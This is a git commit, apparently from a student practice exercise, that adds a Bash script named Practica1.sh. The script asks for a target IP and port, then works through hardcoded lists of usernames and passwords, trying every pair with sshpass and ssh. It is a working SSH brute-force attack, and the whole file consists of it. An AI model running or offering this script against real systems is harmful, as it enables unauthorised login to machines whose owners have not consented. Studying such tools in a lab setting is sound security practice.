548dbc7f46c298941ce4a651001b992f2d1cc82a
algarbado <146922733+algarbado@users.noreply.github.com>
2023-10-05 10:10:10 +0200

    Practica1.sh

---
+++ Practica1.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+echo "Dime la ip"
+read ip
+echo "Dime el puerto"
+read port
+listaNombres=("alejandro" "admin" "jorge" "user" "javier" "pc")
+listaPass=("alejandro3" "pass" "admin1234" "fesac456")
+numNombres=${#listaNombres[@]}
+numPass=${#listaPass[@]}
+for ((i=0; i<$numNombres; i++ ))
+do
+        for((j=0; j<$numPass; j++ ))
+        do
+        sshpass -p "${listaPass[$j]}" ssh -p "$port" "${listaNombres[$i]}@$ip"
+        done
+done
